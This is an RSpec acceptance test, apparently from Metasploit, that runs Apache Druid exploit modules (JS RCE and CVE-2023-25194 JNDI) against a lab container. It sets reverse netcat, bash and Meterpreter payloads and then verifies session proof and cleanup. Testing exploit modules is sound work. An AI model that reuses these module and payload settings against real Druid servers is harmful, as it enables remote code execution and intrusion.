require 'acceptance_spec_helper'
require 'base64'
require 'json'
require 'digest'
require 'shellwords'
require 'timeout'
require 'rex/proto/http/packet'
require 'rex/proto/http/packet/header'
require 'rex/proto/http/response'

RSpec.describe 'Native Apache Druid delivery sessions' do
  include_context 'module target'
  include_context 'wait_for_expect'

  js_owner = 'exploit/linux/http/apache_druid_js_rce'
  jndi_owner = 'exploit/multi/http/apache_druid_cve_2023_25194'

  before(:all) do
    %w[test/module_targets/druid/native_probe.py test/module_targets/druid_sessions/native_delivery_probe.py test/module_targets/druid_sessions/native_runtime_tools.py].each do |program|
      output, error, status = Open3.capture3({ 'DRUID_TARGET_PROFILE' => 'jndi' }, 'python3', '-B', program)
      File.write(artifact(File.basename(program, '.py') + '-status.json'), JSON.pretty_generate(exitstatus: status.exitstatus, stderr: error))
      expect(status.success?).to be(true), error
      File.write(artifact(File.basename(program, '.py') + '-stdout.json'), output)
    end
    native = JSON.parse(File.read(artifact('native-druid-proof.json')))
    expect(native.fetch('counts')).to eq('commands' => 46, 'requests' => 21)
    delivery = JSON.parse(File.read(artifact('native-delivery/proof.json')))
    expect(delivery.fetch('architectures').transform_values { |entry| entry.fetch('actual_exitstatus') }).to eq('64' => 42, '32' => 42)
    expect(delivery.fetch('counts')).to eq('commands' => 48, 'requests' => 5)
    tools = JSON.parse(File.read(artifact('native-runtime-tools/proof.json')))
    expect(tools.fetch('counts')).to eq('commands' => 18, 'requests' => 0)
    target_runtime.fetch('module_endpoints').merge!(JSON.parse(File.read(artifact('native-endpoints.json'))).fetch('module_endpoints'))
    installed = console_command("irb -e 'load \"test/module_targets/druid/input_audit.rb\"; puts \"DRUID_CATALOG=\" + DruidTargetInputs.install(framework, \"#{listener_host}\").to_json'")
    @catalog = JSON.parse(installed[/DRUID_CATALOG=(\{.*\})/, 1])
    event = console_command("irb -e 'load \"test/module_targets/druid_sessions/session_control.rb\"; puts \"DRUID_OBSERVER=\" + DruidSessionControl.install(framework).to_json'")
    expect(JSON.parse(event[/DRUID_OBSERVER=(\{.*\})/, 1])).to include('installed' => true)
  end

  before do |example|
    @case_id = example.metadata.fetch(:scoped_id).tr(':', '_')
    @before_files = target_files
    @before_processes = target_processes
    @session_pid = nil
    @proven_iterations = 0
    @expected_elf_machine = nil
    expect(session_action('snapshot')).to eq([])
    expect(console_command('jobs -l')).to include('No active jobs')
    prove_listeners_removed
    start_capture
  end

  after do |example|
    if [Acceptance::ChildProcessRecvError, Acceptance::ChildProcessTimeoutError, Timeout::Error, EOFError, Errno::EPIPE].any? { |type| example.exception.is_a?(type) }
      @console_broken = true
      RSpec.world.wants_to_quit = true
    end
    stop_capture
    restore_case
  end

  [
    ['JS Unix netcat', js_owner, 'Unix (in-memory)', 'cmd/unix/reverse_netcat', 'vulnerable', {}],
    ['JS authenticated wget x64 Meterpreter', js_owner, 'Linux (dropper)', 'linux/x64/meterpreter/reverse_tcp', 'gateway', { 'TARGETURI' => '/auth/', 'HttpUsername' => 'admin', 'HttpPassword' => 'module-target-druid-password', 'CMDSTAGER::FLAVOR' => 'wget', 'CMDSTAGER::URIPATH' => '/module-target-druid-stager' }],
    ['JS wget x86 shell', js_owner, 'Linux (dropper)', 'linux/x86/shell_reverse_tcp', 'vulnerable', { 'CMDSTAGER::FLAVOR' => 'wget', 'CMDSTAGER::URIPATH' => '/module-target-druid-stager' }],
    ['JNDI Bash shell', jndi_owner, 'Linux', 'cmd/unix/reverse_bash', 'vulnerable', {}],
    ['JNDI prefixed netcat shell', jndi_owner, 'Linux', 'cmd/unix/reverse_netcat', 'gateway', { 'TARGETURI' => '/prefix/' }]
  ].each do |label, owner, target_name, payload, service, options|
    it "uses #{label} twice with native process and cleanup proof" do
      2.times do |iteration|
        run_session_iteration(owner, target_name, payload, service, options, iteration)
      end
    end
  end

  def artifact(name)
    File.join(target_runtime.fetch('artifacts'), name)
  end

  def record(name, value)
    File.open(artifact(name), 'a') { |output| output.puts(JSON.generate(value)) }
  end

  def session_action(action, identifier = nil, path = nil)
    code = "puts 'DRUID_ACTION=' + DruidSessionControl.dispatch(framework, #{action.inspect}, #{identifier.inspect}, #{path.inspect}).to_json"
    output = console_command("irb -e #{code.inspect}", timeout: 15)
    encoded = output[/DRUID_ACTION=(\{.*\}|\[.*\])/, 1]
    expect(encoded).not_to be_nil, output
    value = JSON.parse(encoded)
    expect(value).not_to include('error') if value.is_a?(Hash)
    value
  end

  def run_session_iteration(owner, target_name, payload, service, options, iteration)
    @expected_elf_machine = if payload.include?('/x64/')
                              62
                            else
                              payload.include?('/x86/') ? 3 : nil
                            end
    expect(session_action('snapshot')).to eq([])
    expect(target_files).to eq(@before_files)
    expect(target_processes).to eq(@before_processes)
    path = "/tmp/module-target-druid-session-#{@case_id}-#{iteration}"
    target = @catalog.fetch(owner).fetch('targets').find { |entry| entry.fetch('name') == target_name }
    expect(target).not_to be_nil
    settings = {
      'TARGETURI' => '/', 'SSL' => false, 'TARGET' => target.fetch('index'), 'PAYLOAD' => payload,
      'LHOST' => listener_host, 'LPORT' => 4445, 'SRVHOST' => listener_host,
      'SRVPORT' => owner == 'exploit/linux/http/apache_druid_js_rce' ? 8081 : 3389, 'WfsDelay' => 15,
      'HttpClientTimeout' => 8, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true,
      'DisablePayloadHandler' => false
    }.merge(options)
    code = "mod = framework.modules.create(#{owner.inspect}); mod.datastore['TARGET'] = #{target.fetch('index')}; puts 'DRUID_COMPAT=' + {name: mod.target.name, payload: #{payload.inspect}, supported: mod.compatible_payloads.map(&:first).include?(#{payload.inspect})}.to_json"
    compatibility = console_command("irb -e #{code.inspect}")
    actual = JSON.parse(compatibility[/DRUID_COMPAT=(\{.*\})/, 1])
    record('actual-payload-compatibility.jsonl', actual.merge(case: @case_id, iteration: iteration))
    expect(actual).to include('name' => target_name, 'payload' => payload, 'supported' => true)
    output = run_target_module(owner, service, settings, action: 'run -z', allow_errors: true, command_timeout: 65)
    expect(output).not_to include('Unknown datastore option', 'Invalid option', 'not a compatible payload', 'Parse error:')
    kind = payload.include?('meterpreter') ? 'meterpreter' : 'shell'
    identifier = nil
    Timeout.timeout(30) do
      wait_for_expect(150, 0.2) do
        active = session_action('snapshot')
        ready = File.readlines(artifact('ready-sessions.jsonl')).map { |line| JSON.parse(line) }
        selected = active.find { |entry| entry.fetch('type') == kind && ready.any? { |event| event.fetch('id') == entry.fetch('id') } }
        expect(selected).not_to be_nil, "No initialized #{kind} after real module run: #{output}"
        identifier = selected.fetch('id')
      end
    end
    proof = session_action('proof', identifier, path)
    @session_pid = proof.fetch('pid')
    expect(@before_processes).not_to have_key(@session_pid)
    expect(target_exec('vulnerable', 'test', '-d', "/proc/#{@session_pid}")).to eq('')
    wait_for_expect(30, 0.1) { expect(target_exec('vulnerable', 'sh', '-c', 'if test -f "$1"; then cat "$1"; else printf MODULE_TARGET_MISSING; fi', 'sh', path)).to eq(proof.fetch('expected')) }
    expect(target_exec('vulnerable', 'stat', '-c', '%u:%g:%s', path).strip).to eq("1000:1000:#{proof.fetch('expected').bytesize}")
    status = target_exec('vulnerable', 'cat', "/proc/#{@session_pid}/status")
    expect(status).to match(/^Uid:\s+1000\s+1000\s+1000\s+1000$/)
    @proven_iterations += 1
    record('remote-session-proof.jsonl', case: @case_id, iteration: iteration, owner: owner, payload: payload, proof: proof, native_proc_status: status)
    # Keep the listener closed before remote exit, so old requests cannot use a
    # subsequent handler. Actual target PID disappearance precedes kill fallback.
    console_command('jobs -K')
    session_action('exit', identifier)
    wait_for_target { expect(process_present?(@session_pid)).to be(false) }
    console_command('sessions -K')
    expect(session_action('snapshot')).to eq([])
    wait_for_target { expect(target_processes).to eq(@before_processes) }
    record('session-process-cleanup.jsonl', case: @case_id, iteration: iteration, pid: @session_pid, actual_live_pid_seen: true, actual_pid_absent_before_fallback: true, all_processes_restored: true)
    @session_pid = nil
    capture_files
    restore_files
    prove_listeners_removed
    prove_http_resources_removed
    expect(target_exec('vulnerable', 'wget', '-qO-', 'http://127.0.0.1:8081/status/health')).to eq('true')
    expect(output).not_to include('[-]')
  end

  def wait_for_target(&block)
    Timeout.timeout(20) { wait_for_expect(100, 0.1, &block) }
  end

  def target_files
    target_exec('vulnerable', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-print').lines.map(&:strip).sort
  end

  def target_processes
    text = target_exec('vulnerable', 'ps', '-o', 'pid,ppid,args')
    text.lines.filter_map do |line|
      next unless (matched = line.match(/\A\s*(\d+)\s+(\d+)\s+(.*)\n?\z/))
      next if matched[3].strip == 'ps -o pid,ppid,args'

      [matched[1].to_i, { 'ppid' => matched[2].to_i, 'args' => matched[3].strip }]
    end.to_h
  end

  def process_present?(identifier)
    target_exec('vulnerable', 'sh', '-c', 'if test -d "$1"; then printf present; else printf absent; fi', 'sh', "/proc/#{identifier}") == 'present'
  end

  def capture_files
    (target_files - @before_files).each do |path|
      type = target_exec('vulnerable', 'stat', '-c', '%F', path).strip
      if type.include?('regular')
        destination = "target-#{@case_id}-#{File.basename(path)}"
        text, status = Open3.capture2e(*target_runtime.fetch('compose'), 'cp', "vulnerable:#{path}", artifact(destination))
        record('native-copies.jsonl', path: path, destination: destination, exitstatus: status.exitstatus, output: text)
        expect(status.success?).to be(true), text
      else
        record('native-other-files.jsonl', path: path, type: type)
      end
    end
  end

  def restore_files
    added = target_files - @before_files
    added.each { |path| target_exec('vulnerable', 'rm', '-rf', '--', path) }
    expect(target_files).to eq(@before_files)
    record('file-restorations.jsonl', case: @case_id, removed: added, restored: true)
  end

  def prove_listeners_removed
    script = 'require "json"; ports=[3389,4445,8081]; out=%w[tcp tcp6 udp udp6].to_h{|kind| path="/proc/net/"+kind; rows=File.exist?(path) ? File.readlines(path).drop(1).map(&:split) : []; [kind,rows.select{|row| ports.include?(row[1].split(":").last.to_i(16)) && (!kind.start_with?("tcp") || row[3]=="0A")}]}; puts JSON.generate(out)'
    wait_for_target do
      rows = JSON.parse(target_exec('framework', 'ruby', '-e', script))
      record('listener-audits.jsonl', case: @case_id, rows: rows)
      expect(rows.values).to all(eq([]))
    end
  end

  def prove_http_resources_removed
    code = 'puts "DRUID_HTTP_POOL=" + JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).select{|server| [8081].include?(server.listen_port)}.map{|server| {port:server.listen_port,resources:server.resources.keys,references:server.instance_variable_get(:@_references)}})'
    output = console_command("irb -e #{code.inspect}")
    encoded = output[/DRUID_HTTP_POOL=(\[.*\])/, 1]
    expect(encoded).not_to be_nil, output
    pool = JSON.parse(encoded)
    record('http-service-manager.jsonl', case: @case_id, pool: pool)
    # Current fetch component closes its last owner; preserve concurrent-owner
    # resources in component tests. A pooled socket must never be called closed.
    expect(pool).to eq([])
    { 8081 => '/module-target-druid-stager' }.each do |port, path|
      url = "http://#{listener_host}:#{port}#{path}"
      response = JSON.parse(target_exec('framework', 'ruby', 'test/module_targets/solr_backup/fetch_probe.rb', url))
      record('actual-http-resource-removal.jsonl', case: @case_id, url: url, response: response)
      expect(response.slice('state', 'error')).to eq('state' => 'refused', 'error' => 'Errno::ECONNREFUSED')
    end
  end

  def restore_case
    return unless @before_files

    unless @console_broken
      console_command('jobs -K')
      ready = File.readlines(artifact('ready-sessions.jsonl')).map { |line| JSON.parse(line).fetch('id') }
      session_action('snapshot').select { |row| ready.include?(row.fetch('id')) }.each do |row|
        session_action('exit', row.fetch('id'))
      end
      console_command('sessions -K')
      expect(session_action('snapshot')).to eq([])
    end
    begin
      wait_for_target { expect(target_processes).to eq(@before_processes) }
    rescue RSpec::Expectations::ExpectationNotMetError, Timeout::Error => e
      record('process-grace-period-expired.jsonl', case: @case_id, error: e.message)
    end
    surviving = target_processes.reject { |pid, _value| @before_processes.key?(pid) }
    record('surviving-processes.jsonl', case: @case_id, processes: surviving)
    surviving.each do |pid, details|
      permitted = details.fetch('args').match?(%r{(?:\A|[ /])(?:ba)?sh\b|\bnc\b|\bsleep\b|/tmp/})
      expect(permitted).to be(true), details.inspect
      target_exec('vulnerable', 'kill', '-TERM', pid.to_s) if process_present?(pid)
    end
    wait_for_target { expect(target_processes).to eq(@before_processes) }
    capture_files
    restore_files
    prove_listeners_removed unless @console_broken
    prove_http_resources_removed unless @console_broken
    expect(surviving).to eq({})
  rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
    record('cleanup-errors.jsonl', case: @case_id, type: e.class.name, message: e.message)
    RSpec.world.wants_to_quit = true
    raise
  ensure
    @before_files = nil
  end

  def start_capture
    @capture_lines = []
    @capture_argv = target_runtime.fetch('compose') + ['exec', '-T', 'wire', 'sh', '-c', "printf 'TCPDUMP_PID=%s\\n' \"$$\"; exec tcpdump -i eth0 -B 16384 --immediate-mode -U -s 0 -Z root -w /artifacts/session-#{@case_id}.pcap 'tcp port 8081 or tcp port 3389 or tcp port 4445'"]
    @capture_input, @capture_output, @capture_waiter = Open3.popen2e(*@capture_argv)
    Timeout.timeout(8) do
      loop do
        line = @capture_output.gets
        raise 'Packet capture exited before readiness' unless line

        @capture_lines << line
        @capture_pid ||= line[/TCPDUMP_PID=(\d+)/, 1]
        break if line.include?('listening on eth0')
      end
    end
    expect(@capture_pid).not_to be_nil
  end

  def stop_capture
    return unless @capture_waiter

    if @capture_waiter.alive? && @capture_pid
      text, status = Open3.capture2e(*target_runtime.fetch('compose'), 'exec', '-T', 'wire', 'kill', '-INT', @capture_pid)
      expect(status.success?).to be(true), text
    end
    expect(@capture_waiter.join(8)).not_to be_nil
    @capture_input.close
    @capture_lines << @capture_output.read
    @capture_output.close
    record('packet-capture-controllers.jsonl', case: @case_id, argv: @capture_argv, exitstatus: @capture_waiter.value.exitstatus, output: @capture_lines.join)
    expect(@capture_waiter.value.success?).to be(true)
    expect(@capture_lines.join).to match(/^0 packets dropped by kernel$/)
    parser = "import sys,json; sys.path.insert(0,'test/module_targets/capture_core'); from native_client import tcp_streams; print(json.dumps(tcp_streams(sys.argv[1]),indent=2))"
    decoded, status = Open3.capture2e('python3', '-B', '-c', parser, artifact("session-#{@case_id}.pcap"))
    expect(status.success?).to be(true), decoded
    File.write(artifact("session-#{@case_id}.wire.json"), decoded)
    preserve_actual_elf(JSON.parse(decoded))
  ensure
    @capture_waiter = @capture_pid = nil
  end

  def preserve_actual_elf(streams)
    counter = 0
    streams.select { |stream| [8081].include?(stream.fetch('source_port')) }.each do |stream|
      remaining = Base64.strict_decode64(stream.fetch('base64'))
      until remaining.empty?
        response = Rex::Proto::Http::Response.new
        parsed = response.parse(remaining)
        unless parsed == Rex::Proto::Http::Packet::ParseCode::Completed
          record('incomplete-http-wire.jsonl', case: @case_id, parse_code: parsed, actual_stream_base64: Base64.strict_encode64(remaining))
          break
        end
        body = response.body
        if body.start_with?("\x7fELF".b)
          counter += 1
          expect(body.byteslice(18, 2).unpack1('v')).to eq(@expected_elf_machine) if @expected_elf_machine
          name = "actual-wire-elf-#{@case_id}-#{counter}"
          File.binwrite(artifact(name), body)
          record('actual-wire-elf.jsonl', case: @case_id, path: name, bytes: body.bytesize, sha256: Digest::SHA256.hexdigest(body), elf_class: body.getbyte(4), machine: body.byteslice(18, 2).unpack1('v'), provenance: 'actual target-namespace HTTP response')
        end
        expect(response.bufq.bytesize).to be < remaining.bytesize
        remaining = response.bufq
      end
    end
    expect(counter).to be >= @proven_iterations if @expected_elf_machine && @proven_iterations.positive?
  end
end

# Stop on a broken console before later labels can become cascaded verdicts.
module DruidSessionConsoleGuard
  def console_command(command, timeout: 40)
    raise Acceptance::ChildProcessRecvError, 'Druid console failed; diagnostic stopped' if @console_broken

    super
  rescue Acceptance::ChildProcessRecvError, Acceptance::ChildProcessTimeoutError, EOFError, Errno::EPIPE
    @console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end

RSpec.world.example_groups.find { |group| group.description == 'Native Apache Druid delivery sessions' }.prepend(DruidSessionConsoleGuard)
